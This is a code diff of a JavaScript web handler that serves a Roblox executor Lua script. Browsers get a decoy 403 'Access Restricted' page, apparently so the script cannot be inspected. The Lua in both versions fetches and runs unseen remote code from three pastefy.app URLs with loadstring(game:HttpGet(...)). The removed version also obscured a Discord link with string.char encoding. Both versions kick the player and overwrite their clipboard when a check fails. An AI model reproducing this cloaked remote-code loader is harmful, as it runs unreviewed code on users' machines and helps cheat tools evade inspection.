@@ -1,13 +1,13 @@
 export default function handler(req, res) {
-  const accept = req.headers.accept || "";
+  const accept = (req.headers.accept || "").toLowerCase();
 
   // ===============================
-  // BLOCK BROWSERS / RAW VIEW
+  // BLOCK BROWSERS (HTML ONLY)
   // ===============================
   if (accept.includes("text/html")) {
-    res.setHeader("Content-Type", "text/html");
-res.end(`
-<!DOCTYPE html>
+    res.statusCode = 403;
+    res.setHeader("Content-Type", "text/html; charset=utf-8");
+    res.end(`<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
@@ -16,138 +16,121 @@ res.end(`
 
 <style>
 html, body {
-    margin: 0;
-    padding: 0;
-    width: 100%;
-    height: 100%;
-    font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont;
-    background: linear-gradient(120deg, #000, #111, #000);
-    background-size: 400% 400%;
-    animation: liquid 12s ease infinite;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: #fff;
+  margin: 0;
+  width: 100%;
+  height: 100%;
+  font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont;
+  color: #ffffff;
+
+  background:
+    radial-gradient(60% 80% at 15% 30%, rgba(255,255,255,0.08), transparent 60%),
+    radial-gradient(50% 70% at 85% 70%, rgba(255,255,255,0.06), transparent 65%),
+    radial-gradient(40% 60% at 50% 50%, rgba(255,255,255,0.04), transparent 70%),
+    linear-gradient(120deg, #000000, #0a0a0a, #000000);
+
+  background-size: 300% 300%;
+  animation: inkFlow 22s ease-in-out infinite;
+
+  display: flex;
+  align-items: center;
+  justify-content: center;
 }
 
-@keyframes liquid {
-    0% { background-position: 0% 50%; }
-    50% { background-position: 100% 50%; }
-    100% { background-position: 0% 50%; }
+@keyframes inkFlow {
+  0%   { background-position: 0% 50%; }
+  50%  { background-position: 100% 50%; }
+  100% { background-position: 0% 50%; }
 }
 
 .container {
-    width: 520px;
-    padding: 36px 40px;
-    border-radius: 18px;
-    background: rgba(0, 0, 0, 0.75);
-    backdrop-filter: blur(14px);
-    border: 1px solid rgba(255,255,255,0.08);
-    box-shadow: 0 0 60px rgba(255,255,255,0.08);
+  width: 600px;
+  padding: 44px 48px;
+  border-radius: 20px;
+
+  background: rgba(0, 0, 0, 0.78);
+  backdrop-filter: blur(18px);
+
+  border: 1px solid rgba(255,255,255,0.08);
+  box-shadow:
+    0 0 90px rgba(255,255,255,0.05),
+    inset 0 0 24px rgba(255,255,255,0.025);
 }
 
 .icon {
-    width: 42px;
-    height: 42px;
-    margin-bottom: 14px;
-    color: #ffffff;
+  width: 44px;
+  height: 44px;
+  margin-bottom: 18px;
+  opacity: 0.95;
 }
 
 h1 {
-    font-size: 22px;
-    font-weight: 600;
-    margin: 0 0 12px;
-    letter-spacing: 0.4px;
+  font-size: 22px;
+  font-weight: 600;
+  margin-bottom: 14px;
+  letter-spacing: 0.4px;
 }
 
 p {
-    font-size: 14.5px;
-    line-height: 1.6;
-    opacity: 0.85;
+  font-size: 14.6px;
+  line-height: 1.65;
+  opacity: 0.86;
 }
 
 .footer {
-    margin-top: 22px;
-    font-size: 12px;
-    opacity: 0.45;
+  margin-top: 26px;
+  font-size: 12px;
+  opacity: 0.45;
 }
 </style>
 </head>
-
 <body>
 <div class="container">
-    <!-- Lucide-style Shield Icon -->
-    <svg class="icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-        <path stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"
-            d="M12 3l7 4v5c0 5-3.5 9-7 9s-7-4-7-9V7l7-4z"/>
-    </svg>
+<svg class="icon" xmlns="http://www.w3.org/2000/svg" fill="none"
+viewBox="0 0 24 24" stroke="currentColor">
+<path stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"
+d="M12 3l7 4v5c0 5-3.5 9-7 9s-7-4-7-9V7l7-4z"/>
+</svg>
 
-    <h1>Access Restricted</h1>
+<h1>Access Restricted</h1>
+<p>This endpoint serves protected Lua content intended exclusively for authorized execution environments.</p>
+<p>Direct browser access or inspection is not permitted.</p>
+<p>Please contact the script owner if you believe this is an error.</p>
 
-    <p>
-        This endpoint delivers protected Lua content intended for
-        authorized execution environments only.
-    </p>
-
-    <p>
-        Direct browser access, inspection, or redistribution of this
-        script is strictly prohibited.
-    </p>
-
-    <p>
-        If you believe this restriction is an error, please contact the
-        script owner for proper authorization.
-    </p>
-
-    <div class="footer">
-        © Secure Script Gateway
-    </div>
+<div class="footer">© Secure Script Gateway</div>
 </div>
 </body>
-</html>
-`);
+</html>`);
+    return; // 🔴 VERY IMPORTANT
   }
 
   // ===============================
-  // ROBLOX EXECUTOR (LUA ONLY)
+  // ROBLOX EXECUTORS (RAW LUA)
   // ===============================
+  res.statusCode = 200;
   res.setHeader("Content-Type", "text/plain; charset=utf-8");
-  return res.end(`
--- ðŸ”¹ All Belong 2 @mizu-dump
-local HttpService = game:GetService("HttpService")
 
-local Dc = table.concat({
-    string.char(104,116,116,112,115), -- https (added 115)
-    "://",
-    string.char(100,105,115,99,111,114,100,46,103,103,47),
-    "mxSvSpJe7s"
-})
+  res.end(`-- All Belong 2 @mizu-dump
 
--- ðŸ”¹ Base32 Encode
-local function secureFlag()
-    -- ENC:LS0gQ2hhbmdlIGMgdG8gOTk5OSBpZiB5b3Ugd2FudCBpdCB0byByZXR1cm4gZmFsc2UgYW5kIHRyaWdnZXIga2ljaw== (only Me Can Read This HAHA L FlashHub for skidding my script!!)
-    local a, b, c = 1234, 4321, 5555
-    return ((a + b) - c) == 0
-end
-
-local Enabled = secureFlag()
-
--- ðŸ”¹ Services
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-local HttpService = game:GetService("HttpService")
 
--- ðŸ”¹ Join MizuHub Now!
-if not Enabled then
+local Dc = "https://discord.gg/mxSvSpJe7s"
+
+local function secureFlag()
+  local a, b, c = 1234, 4321, 5555
+  return ((a + b) - c) == 0
+end
+
+if not secureFlag() then
+  if setclipboard then
     setclipboard(Dc)
-    LocalPlayer:Kick("Script Got Skid By @FlashHub.\nDiscord : " .. Dc)
-    return
+  end
+  LocalPlayer:Kick("Unauthorized access detected.\\nDiscord: "..Dc)
+  return
 end
 
 loadstring(game:HttpGet("https://pastefy.app/swVoPwKZ/raw"))()
-
 loadstring(game:HttpGet("https://pastefy.app/cLGvFayb/raw"))()
-
 loadstring(game:HttpGet("https://pastefy.app/ZfpoaVWN/raw"))()
 `);
 }
